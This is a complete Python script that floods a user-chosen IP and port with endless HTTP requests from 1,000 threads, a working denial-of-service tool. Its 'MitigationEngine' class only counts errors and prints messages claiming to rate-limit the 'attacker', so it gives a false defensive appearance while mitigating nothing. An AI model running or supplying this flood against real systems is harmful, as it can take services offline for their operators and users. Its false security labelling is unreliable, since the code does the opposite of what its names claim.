import socket
import threading
import time

class MitigationEngine:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.attack_count = 0
        self.last_mitigation_time = time.time()

    def mitigate_attack(self):
        print("Mitigating attack from IP:", self.ip, "on port:", self.port)
        self.attack_count += 1
        current_time = time.time()
        if self.attack_count > 1000 and current_time - self.last_mitigation_time < 10:
            print("Rate limiting - dropping connections from attacker's IP:", self.ip)
            self.attack_count = 0
            self.last_mitigation_time = current_time
        elif current_time - self.last_mitigation_time >= 10:
            self.attack_count = 0
            self.last_mitigation_time = current_time

def attack(host, port, id, mitigation_engine):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            print(f"[{id}: Request Sent]")
            sock.close()
        except Exception as e:
            print(f"Socket error: {e}")
            mitigation_engine.mitigate_attack()

if __name__ == "__main__":
    THREADS = 1000
    host = input("Enter the target IP address: ")
    port = int(input("Enter the target port (usually 80 for HTTP): "))
    mitigation_engine = MitigationEngine(host, port)
    for x in range(THREADS):
        threading.Thread(target=attack, args=(host, port, x, mitigation_engine)).start()
        time.sleep(0.01)
    input()
